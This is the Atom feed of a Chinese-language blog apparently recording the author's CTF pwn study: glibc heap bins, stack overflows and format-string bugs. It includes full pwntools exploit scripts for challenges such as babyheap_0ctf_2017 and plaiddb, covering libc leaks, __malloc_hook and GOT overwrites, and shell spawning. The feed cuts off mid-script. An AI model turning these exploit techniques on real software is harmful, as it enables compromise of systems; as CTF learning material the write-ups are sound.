<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-03-13T08:45:30.059Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>changyangr</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>重新做人之-pwn-堆溢出</title>
    <link href="http://example.com/2021/10/29/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    <id>http://example.com/2021/10/29/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E5%A0%86%E6%BA%A2%E5%87%BA/</id>
    <published>2021-10-29T09:43:24.000Z</published>
    <updated>2023-03-13T08:45:30.059Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><pre><code>[堆中的各种 bin 漏洞利用](https://blog.csdn.net/A951860555/article/details/115507124)[堆中 各种 bin 详解](https://blog.csdn.net/A951860555/article/details/115507124)</code></pre><h3 id="自我理解"><a href="#自我理解" class="headerlink" title="自我理解"></a>自我理解</h3><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4> <font color="red"><pre><code>何时使用：  当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。（libc-2.26之后要填满tcache）目的：      这主要是为了让“glibc malloc机制”能够有第二次机会重新利用最近释放的chunk(第一次机会就是fast bin机制)。利用unsorted bin，可以加快内存的分配和释放操作，因为整个操作都不再需要花费额外的时间去查找合适的bin了。Unsorted bin的特性如下：        unsorted bin的个数： 1个。        unsorted bin是一个由free chunks组成的循环双链表。        在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。        unsortedbin采用的遍历顺序是FIFO。        当第一个 chunk 进入 unsorted bin 中时，其 fd 和 bk 指针会指向 偏移 main_arena 不远处。        (main_arena 的地址 与libc_base的地址的偏移是固定的 而 libc_base 的地址可以通过 vmmap 查看)</code></pre> </font><h4 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h4> <font folor="#49b1f5"><pre><code>概念：chunk的大小在32字节~128字节（0x20~0x80）的chunk称为“fast chunk”（大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员）。    fast bin链表的个数为10个。(每个链表为一个数组，最多储存 10个)每个fast bin链表都是单链表（使用fd指针）。因此，fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作。(即后进入的先分配)首个进入 fast bin链表的chunk 的 fd 指针 为空，尔后，每个chunk 的fd 指针指向链表中的前一个 chunk。每一次 free main_arena 直接指向被 free 的chunk。</code></pre><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h3 id="buu-babyheap-0ctf-2017"><a href="#buu-babyheap-0ctf-2017" class="headerlink" title="buu - babyheap_0ctf_2017"></a>buu - babyheap_0ctf_2017</h3> <font color="red">    一道简单的堆题，但是对我来说依旧很难。    题目 漏洞：fill 函数存在漏洞，不检查你输入的大小时否溢出，即是否大于当前堆块的大小。    做题思路 ：        可以利用 fill 函数修改 fast bin链表，使得还在使用的 chunk(大小必须满足 unsorted bin) 加入到 fast bin数组中，再次申请一个大小等于该chunk 的chunk，这样就有了两个指针指向同一个chunk。        free 该chunk，然后dump 该chunk，就能泄露出 main_arena 的地址。再次修改 fast bin 链表，使得我们的 fake chunk 能够被创建在 malloc_hook 的不远处。写入 ogg 来 get shell。 </font> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   exp： </span><br><span class="line">   from pwn import *</span><br><span class="line">   context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">   #sp=remote(&#x27;node4.buuoj.cn&#x27;,25667)</span><br><span class="line">   p=process(&#x27;./heap&#x27;)</span><br><span class="line">   def allocate(size):</span><br><span class="line">    p.recvuntil(&#x27;Command: &#x27;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;Size: &#x27;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">   def fill(idx,content):</span><br><span class="line">    p.recvuntil(&#x27;Command: &#x27;)</span><br><span class="line">    p.sendline(&#x27;2&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;Index: &#x27;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&#x27;Size: &#x27;)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">   def free(idx):</span><br><span class="line">    p.recvuntil(&#x27;Command: &#x27;)</span><br><span class="line">    p.sendline(&#x27;3&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;Index: &#x27;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">   def dump(idx):</span><br><span class="line">    p.recvuntil(&#x27;Command: &#x27;)</span><br><span class="line">    p.sendline(&#x27;4&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;Index: &#x27;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvline()</span><br><span class="line">    return p.recvline()</span><br><span class="line"></span><br><span class="line">   def debug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">   allocate(0x10)#0</span><br><span class="line">   allocate(0x10)#1</span><br><span class="line">   allocate(0x10)#2</span><br><span class="line">   allocate(0x10)#3</span><br><span class="line">   allocate(0x80)#4</span><br><span class="line">   free(1)</span><br><span class="line">   free(2)</span><br><span class="line"></span><br><span class="line">   #gdb.attach(p)</span><br><span class="line"></span><br><span class="line">   payload = p64(0) * 3</span><br><span class="line">   payload += p64(0x21)</span><br><span class="line">   payload += p64(0) * 3</span><br><span class="line">   payload += p64(0x21)</span><br><span class="line">   payload += p8(0x80)</span><br><span class="line">   fill(0,payload)</span><br><span class="line"></span><br><span class="line">   #gdb.attach(p)</span><br><span class="line"></span><br><span class="line">   payload = p64(0) * 3</span><br><span class="line">   payload += p64(0x21)</span><br><span class="line">   fill(3,payload)</span><br><span class="line"></span><br><span class="line">   #gdb.attach(p)</span><br><span class="line"></span><br><span class="line">   allocate(0x10)#1</span><br><span class="line">   allocate(0x10)#2</span><br><span class="line">   fill(1,&#x27;aaaa&#x27;)</span><br><span class="line">   fill(2,&#x27;bbbb&#x27;)</span><br><span class="line">   payload = p64(0) * 3</span><br><span class="line">   payload += p64(0x91)</span><br><span class="line">   fill(3,payload)</span><br><span class="line">   allocate(0x80)#5</span><br><span class="line">   free(4)</span><br><span class="line"></span><br><span class="line">   libc_base = u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x3c4b78</span><br><span class="line">   junk=libc_base+0x3c4b78</span><br><span class="line">   log.info(&quot;junk: &quot;+hex(junk))</span><br><span class="line">   log.info(&quot;libc_base: &quot;+hex(libc_base))</span><br><span class="line">   #debug()</span><br><span class="line">   allocate(0x60)#4</span><br><span class="line">   free(4)</span><br><span class="line">   payload = p64(libc_base+0x3c4aed)   #0x3c4aed 为找到的用于创建 fake_chunk 的地址，找到的地址必须得符合chunk size的要求。</span><br><span class="line"></span><br><span class="line">   fill(2, payload)</span><br><span class="line"></span><br><span class="line">   allocate(0x60)#4</span><br><span class="line"></span><br><span class="line">   allocate(0x60)#6</span><br><span class="line">   #debug()</span><br><span class="line">   payload = p8(0)*3</span><br><span class="line">   payload += p64(0)*2</span><br><span class="line">   payload += p64(libc_base+0x4527a) #0x4527a为 ogg 的地址</span><br><span class="line">   fill(6, payload)</span><br><span class="line"></span><br><span class="line">   #gdb.attach(p)</span><br><span class="line"></span><br><span class="line">   allocate(255)</span><br><span class="line"></span><br><span class="line">   p.interactive()</span><br><span class="line">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line">   找到的 fake_chunk 的地址 如图： </span><br><span class="line">   ![](1.png)</span><br><span class="line">   000000007f 满足 chunk size 0x71 的大小要求。</span><br></pre></td></tr></table></figure><h3 id="ctfwiki-plaidctf-2015-plaiddb"><a href="#ctfwiki-plaidctf-2015-plaiddb" class="headerlink" title="ctfwiki- plaidctf 2015 plaiddb"></a>ctfwiki- plaidctf 2015 plaiddb</h3> <font color="red"><p> 大佬们都太强了，构思真的十分巧妙。我从中学到了 许多。<br> 虽然是一个 off by one 漏洞，但其实我并没有发现 哪里使用了该漏洞。。。<br> 个人 认为主要是 利用了 DEL 函数 会先创建一个 chunk ，然后再去 free ，而这个 chunk 里的值我们是可以随意填的，其大小 也为 0x20 依次乘 2<br> 直接贴上 exp 吧：<br> </p></font><p></p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#! /usr/bin/env python2</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># vim:fenc=utf-8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p=process(&#x27;./dat&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;/home/boy/downloads/pwn-change-libc-main/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;) </span><br><span class="line"></span><br><span class="line">def cmd(command_num):</span><br><span class="line">    p.recvuntil(&#x27;command:&#x27;)</span><br><span class="line">    p.sendline(str(command_num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def put(key, size, data):</span><br><span class="line">    cmd(&#x27;PUT&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;key:&#x27;)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&#x27;size:&#x27;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&#x27;data:&#x27;)</span><br><span class="line">    if len(data) &lt; size:</span><br><span class="line">        p.send(data.ljust(size, &#x27;\x00&#x27;))</span><br><span class="line">    else:</span><br><span class="line">        p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(key):</span><br><span class="line">    cmd(&#x27;DEL&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;key:&#x27;)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get(key):</span><br><span class="line">    cmd(&#x27;GET&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;key:&#x27;)</span><br><span class="line">    p.sendline(key)</span><br><span class="line">    p.recvuntil(&#x27;[&#x27;)</span><br><span class="line">    num = int(p.recvuntil(&#x27; bytes&#x27;).strip(&#x27; bytes&#x27;))</span><br><span class="line">    p.recvuntil(&#x27;:\n&#x27;)</span><br><span class="line">    return p.recv(num)</span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # avoid complicity of structure malloc</span><br><span class="line">    </span><br><span class="line">    for i in range(10):</span><br><span class="line">        put(str(i), 0x38, str(i))</span><br><span class="line">                                      # 相关函数实现的时候用到了一些0x38大小的块，避免影响我们提前搞一些            </span><br><span class="line">    for i in range(10):</span><br><span class="line">        delete(str(i))</span><br><span class="line">    </span><br><span class="line">    # allocate what we want in order</span><br><span class="line">    put(&#x27;1&#x27;, 0x200, &#x27;1&#x27;)</span><br><span class="line">    put(&#x27;2&#x27;, 0x50, &#x27;2&#x27;)</span><br><span class="line">    put(&#x27;5&#x27;, 0x68, &#x27;6&#x27;)</span><br><span class="line">    put(&#x27;3&#x27;, 0x1f8, &#x27;3&#x27;)</span><br><span class="line">    put(&#x27;4&#x27;, 0xf0, &#x27;4&#x27;)</span><br><span class="line">    put(&#x27;defense&#x27;, 0x400, &#x27;defense-data&#x27;)    </span><br><span class="line">    </span><br><span class="line">    # free those need to be freed         #切割 空闲 chunk 时的顺序： unsorted bin &gt; 其他bin 而如果 有fast bin 满足需求，则先用fast bin</span><br><span class="line">    delete(&#x27;5&#x27;)</span><br><span class="line">    delete(&#x27;3&#x27;)</span><br><span class="line">    delete(&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">    delete(&#x27;a&#x27; * 0x1f0 + p64(0x4e0))      #溢出，4e0=0x200+0x50+0x68+0x1f8+0x30 原理： 堆块的 pre size 位，如果该 chunk 正在使用，则用来储存上一                         </span><br><span class="line">    delete(&#x27;4&#x27;)                           chunk 的内容，如果 该 chunk 空闲，则用来记录 上一 (空闲) chunk 的size，这里覆盖 pre size 位位0x4e0，</span><br><span class="line">    put(&#x27;0x200&#x27;, 0x200, &#x27;fillup&#x27;)         再 free 掉该 chunk ，从而让以上 0x4e0 空间 被 free 掉。然而实际上 有指针指向 被 free 的空间，从而利用 unsorted bin 泄露 libc。</span><br><span class="line">    put(&#x27;0x200 fillup&#x27;, 0x200, &#x27;fillup again&#x27;)  #填充完 后， chunk 2 即为 unsorted bin 中的 第一个 chunk 所以 其 fd 和 bk 指针都指向偏移 main_arena 不远处。 </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    libc_leak = u64(get(&#x27;2&#x27;)[:6].ljust(8, &#x27;\x00&#x27;))</span><br><span class="line">    log.info(&#x27;libc leak: 0x%x&#x27; % libc_leak)</span><br><span class="line">    libc_base = libc_leak - 0x3c4b78</span><br><span class="line">    p.info(&#x27;libc_base: 0x%x&#x27; % libc_base)</span><br><span class="line"></span><br><span class="line">    put(&#x27;fastatk&#x27;, 0x100, &#x27;a&#x27; * 0x58 + p64(0x71) + p64(libc_base + libc.symbols[&#x27;__malloc_hook&#x27;] - 0x10 + 5 - 8)) #伪造一个 fast bin 里的 chunk，经 debug 调试发现，</span><br><span class="line">    put(&#x27;prepare&#x27;, 0x68, &#x27;prepare data&#x27;)                                                                            如果满足 fast bin 里的 chunk 构造 规则，即能够被识别为</span><br><span class="line">    one_gadget = libc_base + 0x4527a                                                                                fast bin 里的 空闲 chunk。</span><br><span class="line">    p.info(&#x27;ogg_addr: &#x27;+hex(one_gadget))</span><br><span class="line"></span><br><span class="line">    put(&#x27;attack&#x27;, 0x68, &#x27;a&#x27; * 3 + p64(one_gadget))</span><br><span class="line">    debug()</span><br><span class="line">    p.sendline(&#x27;DEL&#x27;) # malloc(8) triggers one_gadget</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line">    </span><br></pre></td></tr></table></figure></font>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pwn 出现  Got EOF while reading in interactive 报错</title>
    <link href="http://example.com/2021/10/29/pwn-Got-EOF-while-reading-in-interactive/"/>
    <id>http://example.com/2021/10/29/pwn-Got-EOF-while-reading-in-interactive/</id>
    <published>2021-10-29T08:54:33.000Z</published>
    <updated>2021-10-29T09:17:48.073Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="pwn-出现-Got-EOF-while-reading-in-interactive-报错"><a href="#pwn-出现-Got-EOF-while-reading-in-interactive-报错" class="headerlink" title="pwn 出现  Got EOF while reading in interactive 报错"></a>pwn 出现  Got EOF while reading in interactive 报错</h2> <font face="黑体" color="#49b1f5" size="5"><p> 出现Got EOF while reading in interactive 的报错，就我目前为止，所遇到的，有 3 情况 :</p><ol><li>地址错误，导致没有 get shell；</li></ol></font><font color="red">地址错误的话，需要查看 libc 的版本是否是对的。一般来说 远程打不通，本地能通都是这个问题。推荐下一个 LibcSearcher ,虽然有 libc database search 网站可以查阅，但网站了里面的 libc 似乎是不全的。或则直接就是 你的地址没有找对。建议 现在本地尝试一下。 本地的 libc 加载地址是不变的。当然堆题 需要利用 libc 漏洞的话，就不建议了。 </font> <font face="黑体" color="#49b1f5" size="5"><ol start="2"><li>栈没有对齐。</li></ol></font><font color="red">栈没有对齐一般是因为 Ubuntu18.04 64位 和 部分 Ubuntu16.04 64位 调用 system 的时候，rsp 的最低字节必须为 0x00（栈以16字节对齐），否则无法运行 system 指令。<p> 要解决这个问题，只要将返回地址设置为跳过函数开头的 push rbp 就可以了。(加 ret 也同样好使。)<br> 有时候也可能是因为 ret 而导致的不能 get shell 。 有时候 ret 为奇数能 get shell ，为偶数不能。 反之亦然。<br> 所以遇到这种情况多试试就行了。<br> </p></font><p></p> <font face="黑体" color="#49b1f5" size="5"><ol start="3"><li>没有返回地址。</li></ol> </font> <font color="red"><p> 没有返回地址一样可能会造成 错误而无法 get shell。 加上就行  如：  p64(0xdeadbeef) 和 p32(0)<br> </p></font><p></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>重新做人之 pwn 栈溢出</title>
    <link href="http://example.com/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://example.com/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2021-10-28T06:27:45.000Z</published>
    <updated>2023-03-13T08:43:00.293Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2> <font color="red"><p> 函数状态主要涉及三个寄存器－－esp，ebp，eip。<br> esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。<br> ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。<br> eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p><p> 这是一个栈：<br> <img src="/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/zhan.jpg"><br> caller: 调用函数<br> callee: 被调用函数<br> 我们通过函数向栈里面写入的数据应是从 argn 开始，一路写进去，最后覆盖 callee 的 return address。<br> 所以一般的 payload= padding + (ebp) + (eip)<br> ebp 的覆盖一般来说可以任意。</p> </font><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="格式化字符串介绍"><a href="#格式化字符串介绍" class="headerlink" title="格式化字符串介绍"></a>格式化字符串介绍</h3> <font color="red"><pre><code>格式化字符串是一个使 printf 类函数 错误的漏洞，虽然利用方法（对我来说）较难，但是利用方式却多样。</code></pre> </font> <font color="Blue">  <p> 格式化字符串 漏洞 ：<br>    %x : 输出一个16进制数，前面没有 0x<br>    %p : 输出一个16进制数，前面带有 0x （一般来说，使用 %p 来泄露地址）<br>    %c : 写入一个字符，用来填充字符 如 %13c，经 printf 识别，就会写入13个字符。 劫持 got 表时，需要用到。<br>    %s : 输出一个字符串。 可以用来泄露地址。<br>    %n : 写入一个数字，且为已写入字符的数量，配合 %c 修改地址。<br>    （除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。）</p> </font> <font face="黑体" color="red" size="5"><p> 32位是通过堆栈传参，顺序依次是：EBX，ECX，EDX,ESI,EDI,EBP<br> 64位是通过寄存器+堆栈传参，顺序依次是：rdi、rsi、rdx、r10、r8、r9（edi、esi、edx、r10、r8、r9）<br> 注意：<br> 我们向栈里写入的数据是先存放在栈上，后通过 printf 识别，再输出的。所以 本身的 %p 之类被识别的指令，也是会在栈上占据位置。 </p> </font> <font color="green"><p> 32位 格式化字符串漏洞的 got表 劫持：<br> offset = 5<br> payload=p32(got)+’%’+str(system-4)+’c%5$n’ 将got里存放的地址写为system的 地址。</p><p> 也可以这么写：<br> offset = 5<br> payload=p32(got)+p32(got+1)+p32(got+2)+p32(got+3)<br> payload+=’%’+str()+’c%5$hhn’<br> payload+=’%’+str()+’c%6$hhn’<br> payload+=’%’+str()+’c%7$hhn’<br> payload+=’%’+str()+’c%8$hhn’<br> 依照位次而定，每一个覆盖是2位。（因为无论是32位或是64位 汇编，都是小端序，所以需要倒着写）</p> </font> <font color="red"><p> 64位 格式化字符串漏洞的 got表 劫持：</p><p> 64位是通过寄存器+堆栈传参，顺序依次是：rdi、rsi、rdx、rcx、r8、r9（edi、esi、edx、ecx、r8、r9）</p><p> offset=6    一般情况下偏移为 6 或 7</p><p> 由于64位下用户可见的内存地址高位都带有\x00(64位地址共16个16进制数)，而 \x00 是字符串结束符。<br> 所以 应把要改 的 got表地址 放在后面，且不能用%hhn 分段写。<br> 如：<br> payload=’a%’+str(system-1)+’c%8$lln’+p64(got)     加 a 是为了使得数据在栈上对齐。</p> </font><h3 id="例题：mid-canary"><a href="#例题：mid-canary" class="headerlink" title="例题：mid-canary"></a>例题：mid-canary</h3> <font color="red"> libc 为 libc-2.23.11.3 checksec 使用带 canary 的64位 elf 程序。 一个一轮游的 格式化字符串漏洞。 <p> <img src="/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/ca1.png"></p><p> 因为只走一轮，且有 canary 所以肯定不能够直接拿到shell。</p><p> 只有 劫持 stack_chk_fail 函数为 main 函数。</p><p> 在输入之后，输出之前下断点查看寄存器的值。<br> <img src="/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/ca2.png"></p><p> 发现 rcx 里的存放着 write_nocancel+7 的值,而 write_nocancel 为调用write 需要调用的函数，且彼此之间的偏移是固定的。</p><p> 所以我们只需要泄露出 rcx 的值就可以计算出 write_addr ，从而泄露出 libc 的偏移。</p><p> 而 rcx 为64位 传参的第4位，但是 经过测试 发现 偏移为 3 ，即 %3$p 能泄露出地址。</p><p> exp 逻辑： 利用 printf 修改 stack_chk_fail 的got表的地址 为 main 函数，故意触发 stack_chk_fail 返回 main 函数，再次利用 printf 拿到 write_nocancel+7 的地址。最后利用 ogg 拿到shell。</p><p> 所以 exp 如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">gdb.attach(io) </span><br><span class="line">pause()</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&quot;./ca&quot;)</span><br><span class="line">elf=ELF(&quot;ca&quot;)</span><br><span class="line">ogg=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">check_fail=elf.got[&#x27;__stack_chk_fail&#x27;]</span><br><span class="line">write_got=elf.got[&#x27;write&#x27;]</span><br><span class="line">print(hex(write_got))</span><br><span class="line">main_addr=0x00400737</span><br><span class="line"></span><br><span class="line">payload=&#x27;a%&#x27;+str(main_addr-1)+&#x27;c%8$lln&#x27;</span><br><span class="line">payload+=p64(check_fail)</span><br><span class="line">payload=payload.ljust(0x118,&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">#payload=&#x27;aaab%7$s&#x27;+p64(write_got)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;What is your name: &quot;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">debug()</span><br><span class="line">io.recvuntil(&quot;Hello &quot;)</span><br><span class="line">junk1=io.recv(16)</span><br><span class="line">print(junk1)</span><br><span class="line"></span><br><span class="line">#io.recvuntil(&quot;aaab&quot;)</span><br><span class="line">#canary=u64(io.recv(18).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">#canary=int(io.recvuntil(&#x27;0x&#x27;,drop=True),16)-240  不用泄露 canary。而且 canary被覆盖住了，泄露不出来。</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;What is your name: &quot;)</span><br><span class="line">exploit=&#x27;aaab&#x27;+&#x27;%3$p&#x27;</span><br><span class="line"></span><br><span class="line">exploit=exploit.ljust(0x118,&#x27;a&#x27;)</span><br><span class="line">io.sendline(exploit)</span><br><span class="line">io.recvuntil(&quot;Hello &quot;)</span><br><span class="line">io.recvuntil(&#x27;ab&#x27;)</span><br><span class="line"></span><br><span class="line">junk=int(io.recv(14),16)-0x10</span><br><span class="line"></span><br><span class="line">#junk=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;write&#x27;,junk)</span><br><span class="line">print(hex(junk))</span><br><span class="line"></span><br><span class="line">base=junk-libc.dump(&#x27;write&#x27;)</span><br><span class="line">ogg_addr=ogg[0]+base</span><br><span class="line"></span><br><span class="line">payload=&#x27;a&#x27;*0x118+p64(ogg_addr)   </span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;What is your name: &quot;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ez-ret3"><a href="#ez-ret3" class="headerlink" title="ez_ret3"></a>ez_ret3</h3> <font color="#49b1f5"> 保护全开的64位elf文件。 <p> 值得注意的是，这个文件也是一个格式化字符串漏洞，同时，在 rcx 的位置放了 read__nocancel+7 ,可能是 libc 的原因？<br> 栈上也有 libc_start_main 的地址，这里泄露 read_nocancel+7 的地址。</p><p> 麻烦的点在于 pie 绕过 ，开启了 pie 后 data段、 text段、 bss段 的地址都会产生偏移，无法用 elf 的操作去得到地址。<br> 但是 地址的后三位是不变的，同时我们只能输入 2 的整数倍的字节数，所以一开始的想法是 爆破第4位。可是换了远程使用的 libc 后，就没有成功过。本地倒是能行。</p><p> exp 逻辑： 首先通过格式化字符串漏洞 拿到 canary 的值，通过覆盖 \x00 返回 main 函数，通过 printf 泄露 read_nocancel+7 地址，最后利用 ogg 拿到 shell<br> 标准 exp 是覆盖 \x00 不太明白。<br></p></font><br> exp 如下：<p></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">gdb.attach(io)</span><br><span class="line">  pause()</span><br><span class="line"></span><br><span class="line">#io = remote(&quot;39.103.198.196&quot;,&#x27;10009&#x27;)</span><br><span class="line">main=0x00000009ED</span><br><span class="line">ogg=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">io = process(&#x27;./tang&#x27;)</span><br><span class="line">#io = remote(&quot;39.103.198.196&quot;,&#x27;10009&#x27;)</span><br><span class="line">elf=ELF(&#x27;tang&#x27;)</span><br><span class="line">libc=ELF(&quot;/home/boy/downloads/pwn-change-libc-main/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><span class="line">payload=&#x27;%9$p&#x27;</span><br><span class="line">shellcode=&#x27;a&#x27;*(0xbca-0xb78)</span><br><span class="line">print(0xbca-0xb78)</span><br><span class="line">shellcode+=asm(shellcraft.sh())</span><br><span class="line">xx=io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">#debug()</span><br><span class="line">canary=int(io.recv(18),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line">#canary=u64(canary)</span><br><span class="line">io.recvline()</span><br><span class="line">sleep(0.1)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">junk=io.recvline()</span><br><span class="line">print(junk)</span><br><span class="line">#list1 =</span><br><span class="line"> [&#x27;\x09&#x27;,&#x27;\x19&#x27;,&#x27;\x29&#x27;,&#x27;\x39&#x27;,&#x27;\x49&#x27;,&#x27;\x59&#x27;,&#x27;\x69&#x27;,&#x27;\x79&#x27;,&#x27;\x89&#x27;,&#x27;\x99&#x27;,&#x27;\xa9&#x27;,&#x27;\xb9&#x27;,&#x27;\xc9&#x27;,&#x27;\xd9&#x27;,&#x27;\xe9&#x27;,&#x27;\xf9&#x27;]</span><br><span class="line">exploit=&#x27;a&#x27;*0x38+p64(canary)+&#x27;a&#x27;*0x18+&#x27;\x00&#x27;</span><br><span class="line">#debug()</span><br><span class="line">sleep(0.1)</span><br><span class="line">#debug()</span><br><span class="line">io.send(exploit)</span><br><span class="line">io.send(&#x27;a%3$p&#x27;)</span><br><span class="line">io.recvuntil(&#x27;a&#x27;)</span><br><span 